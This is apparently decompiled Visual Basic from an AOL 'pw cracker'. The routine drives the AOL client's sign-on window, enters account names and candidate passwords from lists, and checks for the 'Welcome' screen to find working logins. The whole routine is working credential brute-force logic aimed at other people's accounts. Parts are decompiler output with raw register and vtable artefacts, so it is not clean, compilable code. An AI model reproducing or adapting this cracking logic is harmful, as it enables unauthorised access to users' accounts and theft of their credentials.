ï»¿Private Sub Command1_Click() '5E0CD0
  Dim var_1DC As ComboBox
  Dim var_1BC As Variant
  Dim var_2A0 As ComboBox
  loc_005E0E48: var_eax = call Proc_79_48_6097A0(var_1DC, edi, Me)
  loc_005E0E83: If (var_1DC = "") = 0 Then GoTo loc_005E0F2D
  loc_005E0EC1: 
  loc_005E0ED7: var_1DC = "please sign off before using the pw cracker."
  loc_005E0F28: GoTo loc_005E2603
  loc_005E0F2D: 'Referenced from: 005E0E83
  loc_005E0F50: var_280 = Combo1.ListCount
  loc_005E0F7D: setz dl
  loc_005E0F8D: If edx = 0 Then GoTo loc_005E1037
  loc_005E0FE1: var_1DC = "you dont have any accounts to crack"
  loc_005E1032: GoTo loc_005E2603
  loc_005E1037: 'Referenced from: 005E0F8D
  loc_005E105A: var_280 = Combo2.ListCount
  loc_005E1087: setz al
  loc_005E1097: If eax = 0 Then GoTo loc_005E1141
  loc_005E10EB: var_1DC = "you dont have any passwords to check"
  loc_005E113C: GoTo loc_005E2603
  loc_005E1141: 'Referenced from: 005E1097
  loc_005E1164: var_1A0 = Combo4.Text
  loc_005E11A0: edi = (var_1A0 = vbNullString) + 1
  loc_005E11B8: If (var_1A0 = vbNullString) + 1 = 0 Then GoTo loc_005E11F7
  loc_005E11E8: var_244 = "Select a logoff pause"
  loc_005E11F2: GoTo loc_005E0EC1
  loc_005E11F7: 'Referenced from: 005E11B8
  loc_005E1204: var_ret_1 = "AOL Frame25"
  loc_005E120B: var_eax = FindWindow(var_ret_1, 0)
  loc_005E1224: var_ret_2 = FindWindow(var_ret_1, 0)
  loc_005E1230: var_D8 = var_ret_2
  loc_005E1249: var_ret_3 = "AOL Child"
  loc_005E1259: var_eax = FindWindowEx(var_D8, ebx, var_ret_3, 0)
  loc_005E1278: var_60 = FindWindowEx(var_D8, ebx, var_ret_3, 0)
  loc_005E1285: If var_60 = 0 Then GoTo loc_005E15AC
  loc_005E129D: var_328 = var_60
  loc_005E12A3: var_ret_5 = "_AOL_Combobox"
  loc_005E12AD: var_eax = FindWindowEx(var_60, 0, var_ret_5, 0)
  loc_005E12B2: var_284 = FindWindowEx(var_60, 0, var_ret_5, 0)
  loc_005E12C6: var_244 = var_284
  loc_005E12E2: var_144 = var_284
  loc_005E130F: var_ret_6 = CLng(var_144)
  loc_005E1316: var_eax = SendMessage(var_ret_6, 326, 0, var_280)
  loc_005E131B: var_284 = SendMessage(var_ret_6, 326, 0, var_280)
  loc_005E132C: var_244 = var_284
  loc_005E1389: var_ret_8 = CLng(var_284 - 2)
  loc_005E139C: var_ret_9 = CLng(var_144)
  loc_005E13A3: var_eax = SendMessage(var_ret_9, 334, var_ret_8, var_280)
  loc_005E13A8: var_284 = SendMessage(var_ret_9, 334, var_ret_8, var_280)
  loc_005E13C2: var_244 = var_284
  loc_005E13D2: var_19C = var_284
  loc_005E1410: var_ret_A = CStr("Guest")
  loc_005E141D: var_eax = SendMessage(0, 12, 0, var_ret_A)
  loc_005E1430: var_ret_B = SendMessage(0, 12, 0, var_ret_A)
  loc_005E1476: var_1A0 = Combo4.Text
  loc_005E14BA: var_eax = call Proc_6098C0(CLng(Val(var_1A0)), var_1BC, Me)
  loc_005E14E5: var_ret_C = "_AOL_Edit"
  loc_005E14F5: var_eax = FindWindowEx(var_328, 0, var_ret_C, 0)
  loc_005E14FA: var_284 = FindWindowEx(var_328, 0, var_ret_C, 0)
  loc_005E150E: var_244 = var_284
  loc_005E1521: var_70 = var_284
  loc_005E153B: var_ret_D = "hehe"
  loc_005E154A: var_ret_E = CLng(var_70)
  loc_005E1551: var_eax = SendMessage(var_ret_E, 12, 0, var_ret_D)
  loc_005E1556: var_284 = SendMessage(var_ret_E, 12, 0, var_ret_D)
  loc_005E156A: var_244 = var_284
  loc_005E1580: var_19C = var_284
  loc_005E1598: var_284 = CLng(var_70)
  loc_005E15A5: var_eax = call Proc_608D20(var_284, Me, var_1BC)
  loc_005E15AC: 'Referenced from: 005E1285
  loc_005E15E1: var_2A0 = call Proc_608D20(var_284, Me, var_1BC)
  loc_005E15E7: var_280 = Combo1.ListCount
  loc_005E1617: var_280 = var_280 - 0001h
  loc_005E1633: var_254 = var_280
  loc_005E1664: For var_19C = "" To var_280 Step 1
  loc_005E1670: var_310 = var_2E4
  loc_005E1682: If var_310 = 0 Then GoTo loc_005E18DA
  loc_005E16C3: var_1BC = Combo1.List(CInt(var_1A0))
  loc_005E16F5: var_1D4 = var_1A0
  loc_005E1747: var_2A8 = (Trim(var_1A0) = vbNullString)
  loc_005E1773: If var_2A8 = 0 Then GoTo loc_005E18B4
  loc_005E17A0: var_280 = Combo2.ListCount
  loc_005E17DE: var_1A0 = CStr(var_280)
  loc_005E17FB: var_1D4 = "Attempts left: " & var_1A0
  loc_005E1824: call __vbaVarLateMemSt(var_BC, "Caption", var_1D0)
  loc_005E1874: var_19C = CInt(var_1BC)
  loc_005E1882: var_eax = Combo1.RemoveItem var_19C
  loc_005E18B4: 'Referenced from: 005E1773
  loc_005E18C9: Next var_19C
  loc_005E18CF: var_310 = Next var_19C
  loc_005E18D5: GoTo loc_005E167C
  loc_005E18DA: 'Referenced from: 005E1682
  loc_005E190F: var_2A0 = var_1BC
  loc_005E1915: var_280 = Combo2.ListCount
  loc_005E1945: var_280 = var_280 - 0001h
  loc_005E1961: var_254 = var_280
  loc_005E1992: For var_19C = "" To var_280 Step 1
  loc_005E199E: var_318 = var_304
  loc_005E19B0: If var_318 = 0 Then GoTo loc_005E1C05
  loc_005E19F1: var_1BC = Combo2.List(CInt(var_1A0))
  loc_005E1A23: var_1D4 = var_1A0
  loc_005E1A75: var_2A8 = (Trim(var_1A0) = vbNullString)
  loc_005E1AA1: If var_2A8 = 0 Then GoTo loc_005E1BDF
  loc_005E1ACE: var_280 = Combo2.ListCount
  loc_005E1B29: var_1D4 = "PW's left: " & CStr(var_280)
  loc_005E1B4F: call __vbaVarLateMemSt(var_28, "Caption", var_1D0)
  loc_005E1B9F: var_19C = CInt(var_1BC)
  loc_005E1BAD: var_eax = Combo2.RemoveItem var_19C
  loc_005E1BDF: 'Referenced from: 005E1AA1
  loc_005E1BF4: Next var_19C
  loc_005E1BFA: var_318 = Next var_19C
  loc_005E1C00: GoTo loc_005E19AA
  loc_005E1C05: 'Referenced from: 005E19B0
  loc_005E1C25: var_eax = List1.Clear
  loc_005E1C99: var_280 = Combo2.ListCount
  loc_005E1CDA: var_1A0 = CStr(var_280)
  loc_005E1CEA: var_eax = Unknown_VTable_Call[ecx+00000054h]
  loc_005E1D40: var_2A8 = var_1BC
  loc_005E1D65: var_280 = Combo1.ListCount
  loc_005E1DA0: var_1A0 = CStr(var_280)
  loc_005E1DBA: var_eax = Unknown_VTable_Call[eax+00000054h]
  loc_005E1E1B: var_180 = Timer
  loc_005E1E3A: var_eax = call Proc_6098C0(CLng(0.01), Me, Me)
  loc_005E1E66: var_2A0 = DoEvents
  loc_005E1E6C: var_280 = Stop1.Enabled
  loc_005E1E9F: setz dl
  loc_005E1EB8: If var_2A8 <> 0 Then GoTo loc_005E2592
  loc_005E1ECC: var_ret_10 = "AOL Frame25"
  loc_005E1ED3: var_eax = FindWindow(var_ret_10, 0)
  loc_005E1F0D: var_334 = FindWindow(var_ret_10, 0)
  loc_005E1F13: var_ret_12 = "Welcome"
  loc_005E1F25: var_eax = FindWindowEx(var_334, 0, 0, var_ret_12)
  loc_005E1F44: var_60 = FindWindowEx(var_334, 0, 0, var_ret_12)
  loc_005E1F4E: If var_60 <> 0 Then GoTo loc_005E20D3
  loc_005E1F60: var_ret_14 = "Goodbye from America Online!"
  loc_005E1F72: var_eax = FindWindowEx(var_334, 0, 0, var_ret_14)
  loc_005E1F91: var_60 = FindWindowEx(var_334, 0, 0, var_ret_14)
  loc_005E1F9B: If var_60 = 0 Then GoTo loc_005E1FA8
  loc_005E1F9D: If Not Asm.z_flag Then GoTo loc_005E20D3
  loc_005E1FA3: GoTo loc_005E1E3F
  loc_005E1FA8: 'Referenced from: 005E1F9B
  loc_005E1FB6: var_ret_16 = "_AOL_Icon"
  loc_005E1FC1: var_eax = FindWindowEx(0, 0, var_ret_16, 0)
  loc_005E1FE0: var_18C = FindWindowEx(0, 0, var_ret_16, 0)
  loc_005E1FF6: var_ret_18 = "_AOL_Icon"
  loc_005E2007: var_eax = FindWindowEx(0, var_18C, var_ret_18, 0)
  loc_005E2026: var_18C = FindWindowEx(0, var_18C, var_ret_18, 0)
  loc_005E203C: var_ret_1A = "_AOL_Icon"
  loc_005E204D: var_eax = FindWindowEx(0, var_18C, var_ret_1A, 0)
  loc_005E206C: var_18C = FindWindowEx(0, var_18C, var_ret_1A, 0)
  loc_005E2082: var_ret_1C = "_AOL_Icon"
  loc_005E2093: var_eax = FindWindowEx(0, var_18C, var_ret_1C, 0)
  loc_005E20CE: var_eax = call Proc_608D20(FindWindowEx(0, FindWindowEx(0, var_18C, var_ret_1C, 0), var_ret_1C, 0), var_1BC, DoEvents)
  loc_005E20D3: 'Referenced from: 005E1F4E
  loc_005E20F5: var_170 = Timer
  loc_005E2120: var_eax = Unknown_VTable_Call[edx+00000054h]
  loc_005E2177: var_280 = Stop1.Enabled
  loc_005E21AA: setz dl
  loc_005E21C3: If var_2A8 <> 0 Then GoTo loc_005E2592
  loc_005E21D7: var_ret_1E = "AOL Frame25"
  loc_005E21DE: var_eax = FindWindow(var_ret_1E, 0)
  loc_005E2218: var_334 = FindWindow(var_ret_1E, 0)
  loc_005E221E: var_ret_20 = "Welcome"
  loc_005E2230: var_eax = FindWindowEx(var_334, 0, 0, var_ret_20)
  loc_005E224F: var_60 = FindWindowEx(var_334, 0, 0, var_ret_20)
  loc_005E2259: If var_60 <> 0 Then GoTo loc_005E229D
  loc_005E2267: var_ret_22 = "Goodbye from America Online!"
  loc_005E2279: var_eax = FindWindowEx(var_334, 0, 0, var_ret_22)
  loc_005E2298: var_60 = FindWindowEx(var_334, 0, 0, var_ret_22)
  loc_005E229D: 'Referenced from: 005E2259
  loc_005E22AB: var_ret_24 = "_AOL_Combobox"
  loc_005E22B9: var_eax = FindWindowEx(var_60, 0, var_ret_24, 0)
  loc_005E22E5: var_4C = FindWindowEx(var_60, 0, var_ret_24, 0)
  loc_005E230D: var_ret_25 = CLng(var_F8)
  loc_005E2318: var_ret_26 = CLng(var_4C)
  loc_005E231F: var_eax = SendMessage(var_ret_26, var_ret_25, 0, var_280)
  loc_005E23A6: var_ret_28 = CLng(SendMessage(var_ret_26, var_ret_25, 0, var_280) - 2)
  loc_005E23B1: var_ret_29 = CLng(var_3C)
  loc_005E23BC: var_ret_2A = CLng(var_4C)
  loc_005E23C3: var_eax = SendMessage(var_ret_2A, var_ret_29, var_ret_28, var_280)
  loc_005E23F2: var_19C = SendMessage(var_ret_2A, var_ret_29, var_ret_28, var_280)
  loc_005E2406: var_ret_2B = "_AOL_ComboBox"
  loc_005E2414: var_eax = FindWindowEx(var_60, 0, var_ret_2B, 0)
  loc_005E2433: var_188 = FindWindowEx(var_60, 0, var_ret_2B, 0)
  loc_005E245B: var_120 = "Guest"
  loc_005E2474: var_eax = SendMessage(var_188, 12, 0, var_120)
  loc_005E2487: var_ret_2D = SendMessage(var_188, 12, 0, var_120)
  loc_005E24B4: var_1A0 = Combo4.Text
  loc_005E24EB: var_284 = CLng(Val(var_1A0))
  loc_005E24F8: var_eax = call Proc_6098C0(var_284, var_1BC, var_ret_2D)
  loc_005E2538: var_280 = Stop1.Enabled
  loc_005E256B: setz dl
  loc_005E2584: If var_2A8 <> 0 Then GoTo loc_005E25BE
  loc_005E258B: If var_60 <> 0 Then GoTo loc_005E2603
  loc_005E258D: GoTo loc_005E1FA8
  loc_005E2592: 'Referenced from: 005E1EB8
  loc_005E25B3: var_eax = Unknown_VTable_Call[edx+00000054h]
  loc_005E25BA: If Unknown_VTable_Call[edx+00000054h] >= 0 Then GoTo loc_005E25F7
  loc_005E25BC: GoTo loc_005E25E8
  loc_005E25BE: 'Referenced from: 005E2584
  loc_005E25DF: var_eax = Unknown_VTable_Call[edx+00000054h]
  loc_005E25E6: If Unknown_VTable_Call[edx+00000054h] >= 0 Then GoTo loc_005E25F7
  loc_005E25E8: 'Referenced from: 005E25BC
  loc_005E25F1: Unknown_VTable_Call[edx+00000054h] = CheckObj(esi, var_0042DCB0, 84)
  loc_005E25F7: 
  loc_005E2603: 'Referenced from: 005E0F28
  loc_005E2610: GoTo loc_005E26B6
  loc_005E26B5: Exit Sub
  loc_005E26B6: 'Referenced from: 005E2610
  loc_005E2787: Exit Sub
End Sub